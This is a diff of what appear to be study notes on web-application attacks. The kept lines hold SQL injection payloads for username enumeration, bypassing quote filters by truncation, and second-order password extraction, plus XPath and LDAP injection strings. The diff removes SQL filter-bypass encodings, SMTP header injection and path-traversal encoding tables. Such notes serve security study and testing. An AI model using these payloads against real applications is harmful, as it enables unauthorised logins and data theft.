@@ -49,20 +49,6 @@ SELECT CAST(@@version AS int)
 ' or 1 in (select min(username) from users where username > 'a')-- # returns "aaron"
 ' or 1 in (select min(username) from users where username > 'aaron')--
 
-* bypassing filters
-SeLeCt
-SELSELECTECT
-%53%45%4c%45%43%54
-%2553%2545%254c%2545%2543%2554
-SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
-MySQL: SEL/*foo*/ECT username,password FR/*foo*/OM users
-
-Oracle: 'adm'||'in'
-MS-SQL: 'adm'+'in'
-MySQL: concat('adm','in')
-
-exec('sel' + 'ect * fro' + 'm users')
-
 * filter doubles up single quotes
 the payload "admin'--" will not work
 SELECT * FROM users WHERE username = 'admin''--' and password = '' -> user == "admin'--" 
@@ -70,14 +56,12 @@ but filter truncates input to 20 chars
 payload login: aaaaaaaaaaaaaaaaaaa' 
 payload passw: [space]or 1=1--
 SELECT * FROM users WHERE username = 'aaaaaaaaaaaaaaaaaaa'' and passsword = ' or 1=1--' -> user == "aaaaaaaaaaaaaaaaaaa' and password = "
-
-to test for this: 
+test with:
 ''''''''''''''''''''''''''''''''''''''''''''' ... # even number
 a'''''''''''''''''''''''''''''''''''''''''''' ... # odd number
 
 * Second-Order
 INSERT INTO users (username, password, ID, privs) VALUES ('foo''', ... -> inserts "foo'" in db
-
 SELECT password FROM users WHERE username = 'foo'' -> unclosed quotation mark before 'foo
 
 payload: ' or 1 in (select password from users where username ='admin')--
@@ -179,11 +163,6 @@ or
 1 or count(parent::*[position()=1])=0
 1 or count(parent::*[position()=1])>0
  
-# SMTP
-%0aCc:
-%0d%0aBcc:
-%0aDATA%0afoo%0a%2e%0aMAIL+FROM:...
-
 # LDAP
 detect
 )))))
@@ -193,18 +172,6 @@ detect
 ...
 
 john);mail,cn,l,st,c
-
-# Path traversal
-bypassing filters:
-
-           URL-encoding | 16-bit unicode-encoding | double URL-encoding | overlong UTF-8 unicode-encoding
-dot            %2e      | %u002e                  | %252e               | %c0%2e  %e0%40%ae  %c0ae  etc.
-forward slash  %2f      | %u2215                  | %252f               | %c0%af  %e0%80%af  %c0%2f etc.
-backslash      %5c      | %u2216                  | %255c               | %c0%5c  %c0%80%5c  etc.
-
-null byte      %00                                                      | %c0%80 
-
-hex(0x80 + ord('/')) -> %c0%af
 
 # scanners don't work
 Vulnerabilities Detected by Scanners (p649-...)
